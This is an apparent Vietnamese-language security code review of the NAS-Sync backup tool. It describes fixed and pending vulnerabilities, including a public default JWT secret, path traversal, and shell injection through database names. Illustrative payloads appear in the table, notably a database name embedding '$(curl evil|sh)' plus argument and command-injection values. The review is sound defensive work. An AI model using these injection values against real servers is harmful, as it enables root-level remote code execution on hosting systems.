# Code Review — nhánh `wnreview`

Review toàn bộ dự án NAS-Sync (base: `main` @ `e02e1b3`, v1.1.4).

## Đánh giá chung

Code có cấu trúc rõ ràng: adapter riêng cho từng panel, engine tách khỏi API route, hàng đợi có
fallback khi không có Redis, typecheck + build sạch, CI đã chạy cả hai. Các phần khó như restore
cross-panel, GFS retention, hardlink incremental và sandbox verify đều được làm khá kỹ.
Phần lớn truy vấn SQL dùng tham số `?` đúng cách, explorer có kiểm tra path traversal cơ bản, mật
khẩu hash bằng scrypt và so sánh timing-safe.

**Điểm yếu lớn nhất là bảo mật.** Ứng dụng giữ SSH key root của mọi VPS và chạy lệnh shell với
quyền root trên các VPS đó, nên một lỗ hổng ở đây là chiếm quyền toàn bộ hạ tầng. Có 2 lỗi mức
**critical** (đã sửa trong nhánh này):

1. Bản cài mặc định dùng JWT secret công khai, nên ai cũng tự ký được cookie admin.
2. Tên database do khách hàng hosting tự đặt bị nội suy vào lệnh shell, dẫn tới RCE root trên VPS
   và RCE trên NAS.

## Đã sửa trong nhánh này

| # | Mức | Vấn đề | Cách sửa |
|---|-----|--------|----------|
| 1 | Critical | `JWT_SECRET` mặc định công khai: `docker-compose.yml` dùng `nas-sync-open-source-change-this-secret-2026` và `jwt-edge.ts` có fallback cứng. Ai đọc repo cũng ký được token admin cho mọi bản cài không đổi secret. | Thêm `src/lib/jwt-secret.ts`. Nếu `JWT_SECRET` trống, ngắn hơn 32 ký tự hoặc trùng giá trị mẫu, hệ thống tự sinh khóa ngẫu nhiên lưu ở `DATA_DIR/.jwt_secret` (0600). `jwt-edge.ts` không còn fallback mà fail-closed. Compose và `.env.example` để trống mặc định. |
| 2 | Critical | **Shell injection qua tên DB.** Tên DB lấy từ `SHOW DATABASES` (khách cPanel/DA tạo được ``CREATE DATABASE `user_$(curl evil\|sh)` ``) được đặt trong `"..."` bên trong `bash -c '...'` của mysqldump, nên `$(...)` chạy với quyền root trên VPS. Cùng tên đó thành tên file dump rồi bị nội suy vào `bash -c` cục bộ của sandbox verify và restore, tức là RCE trên NAS, nơi giữ SSH key của mọi VPS khác. | Thêm `src/lib/engine/safe-names.ts` (validate domain, user, DB, webroot, host). `finalizeDiscoveredDomains` loại bỏ domain/DB có tên nguy hiểm, mọi adapter đều đi qua hàm này. mysqldump dùng `shellSingleQuote`. `sandbox-verifier` và `restore-worker` truyền đường dẫn và tham số qua `"$1"` / `"$@"` thay vì nội suy chuỗi. |
| 3 | High | Domain từ VPS được ghép thẳng vào `path.join(...)` trên NAS rồi chạy `rsync --delete`. Một VPS bị chiếm có thể trả về `../../<host khác>/...` để xóa snapshot của server khác. | Validate domain ở bước discovery (mục 2). |
| 4 | High | Restore không validate `targetDomainName`, `targetSystemUser`, `targetWebrootOverride` và `targetDbMap`. Webroot `/` biến thành `user@ip:/`, khiến `rsync --delete` + `chown -R` chạy trên toàn bộ ổ của VPS đích. Tên domain hoặc DB chứa `` ` ``/`$()` chạy lệnh root trên VPS đích. | `assertSafe(...)` cho cả 4 trường. Webroot phải là path tuyệt đối, có ít nhất 3 cấp và không chứa `..`. |
| 5 | High | Socket.IO không xác thực và bật `cors: '*'`. Bất kỳ ai truy cập được cổng đều nghe được live log, cảnh báo và tiến trình update. | `io.use()` kiểm tra cookie phiên và bỏ CORS. Client tự kết nối lại sau khi đăng nhập. |
| 6 | Medium | `ip_address` và `ssh_user` không validate, sau đó vào `bash -c` của restore (`1.2.3.4; cmd`) và tham số ssh (`-oProxyCommand=...`). `hostname` thành thư mục trên NAS mà không chặn `../`. | `validateServerConnectionFields()` ở POST/PATCH `/api/servers`. |
| 7 | Medium | Đăng nhập không giới hạn số lần thử, nên có thể dò mật khẩu admin (mặc định `nas-sync@2026`). | `src/lib/login-throttle.ts`: khóa 15 phút sau 10 lần sai theo cặp IP + username, trả về HTTP 429. |
| 8 | Medium | Explorer đi theo symlink trong snapshot. Snapshot sao chép nguyên symlink từ VPS, nên khách hosting tạo `x -> /app/data/nas-sync.db` hoặc `/root/.ssh/<key>` là đọc/tải được file trong container NAS. | `resolveSafeSubPath` kiểm tra `realpath` nằm trong snapshot. |
| 9 | Medium | Lỗi ghi file dump (ENOSPC khi volume đầy) không có listener `error`, gây uncaught exception làm sập cả tiến trình Node và mọi job đang chạy. | Thêm listener `error` (kill ssh, xóa `.part`, reject) và bọc callback rename/stat trong try/catch. |
| 10 | Medium | Download đọc toàn bộ file vào RAM (`readFileSync`). Dump hoặc archive vài GB sẽ OOM hoặc vượt giới hạn Buffer. | Stream bằng `fs.createReadStream` và dùng `filename*=UTF-8''` cho tên file Unicode. |
| 11 | Low | Explorer gặp symlink hỏng (rất phổ biến trong WordPress) thì `statSync` ném ENOENT và hỏng cả danh sách thư mục. | Fallback sang `lstatSync`. |
| 12 | Low | Import SSH key ghi đè file sẵn có trong `/root/.ssh` (VD đặt tên `authorized_keys`, `config` hoặc tên key đang dùng). | Từ chối nếu file đã tồn tại. |
| 13 | Low | Cookie phiên thiếu cờ `Secure` khi chạy sau HTTPS reverse proxy. Option cookie bị lặp ở 3 chỗ. | `sessionCookieOptions(req)` trong `auth.ts` bật `Secure` theo `x-forwarded-proto`. |

### Kiểm tra đã chạy

- `npm run typecheck` và `npm run build`: pass.
- Smoke test trên server thật (`npm start`, Windows, Local Queue): 14/14 pass.
  - API không cookie trả 401.
  - Token ký bằng secret mặc định cũ trả 401.
  - 10 lần login sai thì lần thứ 11 trả 429.
  - Admin login OK.
  - Cờ `Secure` chỉ bật khi đi qua HTTPS proxy.
  - Socket.IO từ chối khi không có cookie, chấp nhận khi có.
  - POST server với IP chứa injection, hostname `../` hoặc ssh_user `-o...` đều trả 400; server bình thường vẫn được nhận.
- Unit check validator và `finalizeDiscoveredDomains`: 13/13 pass. Đã kiểm tra tên file `db_$(touch PWNED).sql` đi qua pipeline `bash -c` mới mà không bị thực thi.
- **Chưa test được:** backup/restore thật với VPS DirectAdmin/cPanel/Plesk/aaPanel, và kiểm tra symlink trên Linux (Windows cần quyền admin để tạo symlink). Cần chạy thử 1 vòng backup + restore trên NAS thật trước khi merge.

### Lưu ý khi nâng cấp

- Bản cài đang dùng `JWT_SECRET` mặc định sẽ tự chuyển sang khóa ngẫu nhiên, nên mọi người phải **đăng nhập lại 1 lần**.
- Domain hoặc DB có tên chứa ký tự lạ (ngoài chữ, số, `.`, `_`, `-`) giờ bị **bỏ qua khi backup** và ghi cảnh báo `[NAS-Sync Security]` ra log container. Nếu có khách hợp lệ bị bỏ sót, cần nới regex trong `safe-names.ts`.

## Chưa sửa — đề xuất làm tiếp

**Bảo mật / độ an toàn dữ liệu**

- **Retention xóa snapshot trong lúc đang restore từ chính snapshot đó** (`retention-gfs.ts:157`). Retention chạy sau mỗi backup mà không có lock. Nếu nguồn bị xóa giữa chừng, `rsync --delete` sẽ xóa file trên site đích. Cần bỏ qua snapshot đang được job RESTORE RUNNING/QUEUED tham chiếu, hoặc dùng mutex theo server.
- **Self-update tải thẳng HEAD của nhánh `main`** (`updater.ts`), không ghim tag/release và không kiểm tra checksum hay chữ ký. Ai có quyền push `main` (hoặc token bị lộ) sẽ có RCE trên mọi NAS bấm "Cập nhật". Nên chuyển sang GitHub Release có tag và kiểm tra SHA256 hoặc chữ ký. Ngoài ra `force: true` bỏ qua kiểm tra job đang chạy.
- `GET /api/settings` trả về nguyên văn `smtp_pass`, `dsm_password`, `telegram_bot_token` và `github_token` cho trình duyệt. Nên mask khi trả về và chỉ ghi khi có giá trị mới.
- `btrfs-worm.ts` gửi mật khẩu DSM qua query string GET, nên nó bị ghi vào log proxy và log DSM. Nên dùng POST.
- Logout chỉ xóa cookie, còn JWT vẫn hợp lệ 7 ngày. Đổi mật khẩu cũng không vô hiệu các phiên khác. Có thể thêm `token_version` vào bảng `users`.
- Không có CSRF token. `sameSite: 'lax'` chặn được phần lớn trường hợp, nhưng nên kiểm tra header `Origin` cho các request POST/PUT/PATCH/DELETE trong middleware.
- `StrictHostKeyChecking=accept-new` và `+ssh-rsa` là chấp nhận được cho kết nối lần đầu, nhưng nên hiển thị fingerprint host key trên UI để admin xác nhận.
- `cpanel.ts` và `directadmin.ts` (`resolveTargetWebroot`) vẫn nội suy `systemUser`/`domain` trong `"..."` ở script remote. Hiện đã an toàn nhờ validate đầu vào ở restore, nhưng nên chuyển sang `shellSingleQuote` để phòng thủ nhiều lớp.

**Ổn định**

- Hai tiến trình con ssh (probe zstd và mysqldump) trong `backup-worker.ts`, `bash -c` trong sandbox/restore và `fetch` trong `btrfs-worm.ts` không có timeout hay theo dõi lệnh hủy. Một VPS treo sẽ giữ slot của hàng đợi mãi mãi.
- Ở `backup-worker.ts`, nếu sandbox verify hoặc anomaly check ném lỗi *sau* khi đã commit atomic, job bị đánh FAILED nhưng symlink `latest` đã trỏ vào snapshot đó.
- `retention-gfs.ts` tính ngày bằng UTC (`toISOString`) nhưng xét Chủ nhật / mùng 1 bằng giờ local, nên gần nửa đêm có thể chọn sai bản đại diện tuần/tháng.

**Chất lượng code**

- Không có test tự động. Nên thêm Vitest cho các phần thuần logic: `safe-names`, `finalizeDiscoveredDomains`, `retention-gfs`, `compareSemver`, `anomaly-detector`. CI hiện chỉ chạy typecheck và build.
- Không có ESLint. Comment `eslint-disable` có trong code nhưng chưa cấu hình lint.
- `backup-worker.ts` (~1200 dòng) nên tách phần stream DB, rsync và mock thành module riêng.
- Các route API trả thẳng `err.message` cho client, có thể lộ đường dẫn nội bộ. Nên log chi tiết ở server và trả thông báo chung.
- `Dockerfile` dùng `npm install` thay vì `npm ci` và copy cả `devDependencies` vào image runtime.
- Tên "SHOST" và "NAS-Sync" lẫn lộn trong log, tên cookie và biến global.
- [Đã chuẩn hóa tại v1.1.5] Đồng bộ hoàn toàn tên định danh hệ thống, log, tên cookie phiên và biến global sang chuẩn `NAS-Sync` / `nas_sync`.
